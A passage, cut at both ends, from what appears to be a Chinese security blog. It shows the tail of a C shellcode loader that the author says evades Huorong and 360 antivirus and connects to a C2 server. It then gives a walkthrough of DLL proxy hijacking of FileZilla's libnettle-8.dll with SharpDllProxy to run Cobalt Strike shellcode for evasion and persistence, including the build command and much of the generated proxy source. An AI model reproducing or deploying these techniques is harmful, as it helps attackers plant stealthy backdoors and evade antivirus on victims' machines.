hThread = CreateThread(</span><br><span class="line">		<span class="literal">NULL</span>, <span class="comment">// 安全描述符</span></span><br><span class="line">		<span class="literal">NULL</span>, <span class="comment">// 栈的大小</span></span><br><span class="line">		(LPTHREAD_START_ROUTINE)shellcode, <span class="comment">// 函数</span></span><br><span class="line">		<span class="literal">NULL</span>, <span class="comment">// 参数</span></span><br><span class="line">		<span class="literal">NULL</span>, <span class="comment">// 线程标志</span></span><br><span class="line">		&amp;dwThreadId <span class="comment">// 线程ID</span></span><br><span class="line">	);</span><br><span class="line"></span><br><span class="line">	WaitForSingleObject(hThread, INFINITE);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>在c2上运行服务端</p>
<p><a target="_blank" rel="noopener" href="https://imgbed.cn/"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/4f8be20b-8018-418a-89f9-cf48d4f24798.PNG" alt="imgbed.cn图床"></a></p>
<p>在目标机器上执行客户端文件,联网情况下火绒和360不查杀</p>
<p><a target="_blank" rel="noopener" href="https://imgbed.cn/"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/6dd0da7e-effb-4afa-b0ab-c5a7a5483302.PNG" alt="imgbed.cn图床"></a></p>
<p>成功上线</p>
<p><a target="_blank" rel="noopener" href="https://imgbed.cn/"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/ffa22ff5-65bd-489f-a3af-365d2939d8d9.png" alt="imgbed.cn图床"></a></p>
<h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/zpchcbd/p/12170851.html">https://www.cnblogs.com/zpchcbd/p/12170851.html</a></p>
<p><a target="_blank" rel="noopener" href="https://payloads.online/archivers/2019-11-10/5">https://payloads.online/archivers/2019-11-10/5</a></p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2020-12-06T09:39:30.000Z" title="2020-12-06T09:39:30.000Z">2020-12-06</time>发表</span><span class="level-item"><time dateTime="2020-12-13T08:42:48.894Z" title="2020-12-13T08:42:48.894Z">2020-12-13</time>更新</span><span class="level-item">1 小时读完 (大约7602个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2020/12/06/DLL%E4%BB%A3%E7%90%86%E5%8A%A0%E8%BD%BDshellcode%E5%AE%9E%E8%B7%B5/">DLL代理加载shellcode实践</a></h1><div class="content"><h1 id=""><a href="#" class="headerlink" title=""></a></h1><p>在程序开发过程中往往会使用第三方库，大多数第三方库会提供DLL(动态链接库)文件，因此程序需要相应的DLL文件才能启动，通过Dll代理将正常dll替换为欸一dll，可以进行免杀或权限维持</p>
<h2 id="找出运行必须的dll文件"><a href="#找出运行必须的dll文件" class="headerlink" title="找出运行必须的dll文件"></a>找出运行必须的dll文件</h2><p>依照<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1739263">DLL代理加载shellcod用于免杀，维权等等</a>中的例子下载Filezilla，将fzsftp.exe放到单独文件夹运行，找到运行必须的libnettle-8.dll文件</p>
<p><a target="_blank" rel="noopener" href="https://imgbed.cn/"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/c7d34521-824d-4e6a-a5b8-0f0f4d0ae451.png" alt="imgbed.cn图床"></a></p>
<h2 id="编译SharpDllProxy"><a href="#编译SharpDllProxy" class="headerlink" title="编译SharpDllProxy"></a>编译SharpDllProxy</h2><p>下载<a target="_blank" rel="noopener" href="https://github.com/Flangvik/SharpDllProxy">SharpDllProxy</a>后用Visual Stuio 2019打开SharpDllProxy.sln</p>
<p><a target="_blank" rel="noopener" href="https://imgbed.cn/"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/c4a78070-bf3b-47e9-b1a4-b0341271a84a.png" alt="imgbed.cn图床"></a></p>
<p>编译生成SharpDllProxy.exe</p>
<p><a target="_blank" rel="noopener" href="https://imgbed.cn/"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/92bcf89d-6ba8-475c-8a6e-e31a3d6dfa70.png" alt="imgbed.cn图床"></a></p>
<p><a target="_blank" rel="noopener" href="https://imgbed.cn/"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/f2af1a5d-1719-4994-ae6a-73edf135ca97.png" alt="imgbed.cn图床"></a></p>
<h2 id="生成代理Dll"><a href="#生成代理Dll" class="headerlink" title="生成代理Dll"></a>生成代理Dll</h2><p>指定目标dll文件后生成libnettle-8_pragma.c和tmp2BF5.dll，payload.bin为cs生成的raw格式shellcode。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sharpdllproxy.exe --dll E:\dllproxy\libnettle-8.dll --payload E:\dllproxy\payload.bin</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://imgbed.cn/"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/d224dd7c-0e3f-4e6c-81c2-cca3e5fd95df.png" alt="imgbed.cn图床"></a></p>
<p>在vs中新建动态链接库将生成的libnettle-8_pragma.c代码复制后编译生成可执行shellcode的同名dll文件用以顶替原有的libnettle-8.dll文件</p>
<p><a target="_blank" rel="noopener" href="https://imgbed.cn/"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/96a19b88-da49-4db1-8bb2-76220cee925b.png" alt="imgbed.cn图床"></a></p>
<p><a target="_blank" rel="noopener" href="https://imgbed.cn/"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/f9649196-5f3d-4208-bf0b-12b3238a90b3.png" alt="imgbed.cn图床"></a></p>
<p>成功执行shellcode需要4个文件,fzsftp.exe调用替换后的恶意libnettle-8.dll文件后从payload.bin中读取shellcode后执行，tmp2BF5.dll即原来正常的libnettle-8.dll文件，保证程序正常运行</p>
<p><a target="_blank" rel="noopener" href="https://imgbed.cn/"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/a2ea32b4-e77d-4b6b-aaca-b2110c185cb7.png" alt="imgbed.cn图床"></a>执行后cs成功上线</p>
<p><a target="_blank" rel="noopener" href="https://imgbed.cn/"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/83b16014-31cb-4acd-b432-91311808019c.png" alt="imgbed.cn图床"></a></p>
<h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><p>用vs打开libnettle-8_pragma.c后查看代码，开头调用了400多个tmp2BF5.dll中的函数以保证文件的正常运行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br></pre></td><td class="code"><pre><span class="line">#include &quot;pch.h&quot;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">#define _CRT_SECURE_NO_DEPRECATE</span><br><span class="line">#pragma warning (disable : 4996)</span><br><span class="line"></span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:_nettle_aeads&#x3D;tmp2BF5._nettle_aeads,@1&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:_nettle_aes_decrypt&#x3D;tmp2BF5._nettle_aes_decrypt,@2&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:_nettle_aes_decrypt_aesni&#x3D;tmp2BF5._nettle_aes_decrypt_aesni,@3&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:_nettle_aes_decrypt_x86_64&#x3D;tmp2BF5._nettle_aes_decrypt_x86_64,@4&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:_nettle_aes_encrypt&#x3D;tmp2BF5._nettle_aes_encrypt,@5&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:_nettle_aes_encrypt_aesni&#x3D;tmp2BF5._nettle_aes_encrypt_aesni,@6&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:_nettle_aes_encrypt_table&#x3D;tmp2BF5._nettle_aes_encrypt_table,@7&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:_nettle_aes_encrypt_x86_64&#x3D;tmp2BF5._nettle_aes_encrypt_x86_64,@8&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:_nettle_aes_invert&#x3D;tmp2BF5._nettle_aes_invert,@9&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:_nettle_aes_set_key&#x3D;tmp2BF5._nettle_aes_set_key,@10&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:_nettle_armors&#x3D;tmp2BF5._nettle_armors,@11&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:_nettle_camellia_absorb&#x3D;tmp2BF5._nettle_camellia_absorb,@12&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:_nettle_camellia_crypt&#x3D;tmp2BF5._nettle_camellia_crypt,@13&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:_nettle_camellia_invert_key&#x3D;tmp2BF5._nettle_camellia_invert_key,@14&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:_nettle_camellia_table&#x3D;tmp2BF5._nettle_camellia_table,@15&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:_nettle_chacha_core&#x3D;tmp2BF5._nettle_chacha_core,@16&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:_nettle_ciphers&#x3D;tmp2BF5._nettle_ciphers,@17&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:_nettle_cpuid&#x3D;tmp2BF5._nettle_cpuid,@18&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:_nettle_ctr_crypt16&#x3D;tmp2BF5._nettle_ctr_crypt16,@19&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:_nettle_gcm_hash8&#x3D;tmp2BF5._nettle_gcm_hash8,@20&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:_nettle_gost28147_encrypt_block&#x3D;tmp2BF5._nettle_gost28147_encrypt_block,@21&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:_nettle_gost28147_param_CryptoPro_3411&#x3D;tmp2BF5._nettle_gost28147_param_CryptoPro_3411,@22&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:_nettle_gost28147_param_test_3411&#x3D;tmp2BF5._nettle_gost28147_param_test_3411,@23&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:_nettle_hashes&#x3D;tmp2BF5._nettle_hashes,@24&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:_nettle_macs&#x3D;tmp2BF5._nettle_macs,@25&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:_nettle_memxor_sse2&#x3D;tmp2BF5._nettle_memxor_sse2,@26&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:_nettle_memxor_x86_64&#x3D;tmp2BF5._nettle_memxor_x86_64,@27&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:_nettle_poly1305_block&#x3D;tmp2BF5._nettle_poly1305_block,@28&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:_nettle_poly1305_digest&#x3D;tmp2BF5._nettle_poly1305_digest,@29&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:_nettle_poly1305_set_key&#x3D;tmp2BF5._nettle_poly1305_set_key,@30&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:_nettle_ripemd160_compress&#x3D;tmp2BF5._nettle_ripemd160_compress,@31&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:_nettle_salsa20_core&#x3D;tmp2BF5._nettle_salsa20_core,@32&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:_nettle_sha1_compress_sha_ni&#x3D;tmp2BF5._nettle_sha1_compress_sha_ni,@33&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:_nettle_sha1_compress_x86_64&#x3D;tmp2BF5._nettle_sha1_compress_x86_64,@34&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:_nettle_sha256_compress&#x3D;tmp2BF5._nettle_sha256_compress,@35&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:_nettle_sha256_compress_sha_ni&#x3D;tmp2BF5._nettle_sha256_compress_sha_ni,@36&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:_nettle_sha256_compress_x86_64&#x3D;tmp2BF5._nettle_sha256_compress_x86_64,@37&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:_nettle_sha3_pad&#x3D;tmp2BF5._nettle_sha3_pad,@38&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:_nettle_sha3_update&#x3D;tmp2BF5._nettle_sha3_update,@39&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:_nettle_sha512_compress&#x3D;tmp2BF5._nettle_sha512_compress,@40&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:_nettle_umac_l2&#x3D;tmp2BF5._nettle_umac_l2,@41&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:_nettle_umac_l2_final&#x3D;tmp2BF5._nettle_umac_l2_final,@42&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:_nettle_umac_l2_init&#x3D;tmp2BF5._nettle_umac_l2_init,@43&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:_nettle_umac_l3&#x3D;tmp2BF5._nettle_umac_l3,@44&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:_nettle_umac_l3_init&#x3D;tmp2BF5._nettle_umac_l3_init,@45&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:_nettle_umac_nh&#x3D;tmp2BF5._nettle_umac_nh,@46&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:_nettle_umac_nh_n&#x3D;tmp2BF5._nettle_umac_nh_n,@47&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:_nettle_umac_poly128&#x3D;tmp2BF5._nettle_umac_poly128,@48&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:_nettle_umac_poly64&#x3D;tmp2BF5._nettle_umac_poly64,@49&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:_nettle_umac_set_key&#x3D;tmp2BF5._nettle_umac_set_key,@50&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:_nettle_write_be32&#x3D;tmp2BF5._nettle_write_be32,@51&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:_nettle_write_le32&#x3D;tmp2BF5._nettle_write_le32,@52&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:_nettle_write_le64&#x3D;tmp2BF5._nettle_write_le64,@53&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_MD5Final&#x3D;tmp2BF5.nettle_MD5Final,@54&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_MD5Init&#x3D;tmp2BF5.nettle_MD5Init,@55&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_MD5Update&#x3D;tmp2BF5.nettle_MD5Update,@56&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_aes128&#x3D;tmp2BF5.nettle_aes128,@57&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_aes128_decrypt&#x3D;tmp2BF5.nettle_aes128_decrypt,@58&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_aes128_encrypt&#x3D;tmp2BF5.nettle_aes128_encrypt,@59&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_aes128_invert_key&#x3D;tmp2BF5.nettle_aes128_invert_key,@60&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_aes128_set_decrypt_key&#x3D;tmp2BF5.nettle_aes128_set_decrypt_key,@61&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_aes128_set_encrypt_key&#x3D;tmp2BF5.nettle_aes128_set_encrypt_key,@62&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_aes192&#x3D;tmp2BF5.nettle_aes192,@63&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_aes192_decrypt&#x3D;tmp2BF5.nettle_aes192_decrypt,@64&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_aes192_encrypt&#x3D;tmp2BF5.nettle_aes192_encrypt,@65&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_aes192_invert_key&#x3D;tmp2BF5.nettle_aes192_invert_key,@66&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_aes192_set_decrypt_key&#x3D;tmp2BF5.nettle_aes192_set_decrypt_key,@67&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_aes192_set_encrypt_key&#x3D;tmp2BF5.nettle_aes192_set_encrypt_key,@68&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_aes256&#x3D;tmp2BF5.nettle_aes256,@69&quot;)</span><br><span class="line">#pragma comment(linker, 